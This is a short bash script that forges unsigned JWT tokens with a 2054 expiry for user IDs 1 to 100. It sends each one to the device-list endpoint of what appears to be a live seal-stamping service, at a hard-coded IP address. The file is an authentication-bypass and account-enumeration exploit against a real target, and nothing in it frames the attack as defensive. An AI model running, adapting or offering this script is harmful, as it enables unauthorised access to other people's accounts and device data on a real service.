#!/bin/bash
#
# vim:ft=sh

QSTAMP_API_URL="http://1.116.190.119/traffic/api/v2"
# QSTAMP_API_URL="https://yunxi.qstamper.com/sealTransferApi"
header=eyJhbGciOiJIUzI1NiJ9 # {"alg":"HS256"}

for i in {1..100}
do
    # exp: Sun Jan 4 08:24:39 PM CST 2054
    payload=$(echo -n "{\"exp\":2651142279,\"username\":\"$i\"}" | basenc --base64url)
    payload=${payload%%=*}
    token=$header.$payload.
    echo uid: $i, token: $token

    api=device/list
    curl -H "tToken: $token" "$QSTAMP_API_URL/$api"
    echo 
done
